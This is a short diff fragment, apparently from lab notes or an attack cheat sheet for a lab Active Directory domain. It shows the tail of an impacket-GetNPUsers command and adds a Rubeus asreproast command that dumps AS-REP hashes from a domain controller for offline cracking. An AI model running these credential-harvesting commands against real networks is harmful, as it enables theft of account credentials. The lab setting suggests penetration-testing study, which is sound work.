@@ -50,4 +50,4 @@ impacket-GetNPUsers lab.local/ \
   -outputfile asrep_hashes.txt
 
 
-
+.\Rubeus.exe asreproast /domain:lab.local /dc:192.168.39.143 /format:hashcat /outfile:C:\Temp\asrep_hashes.txt /nowrap
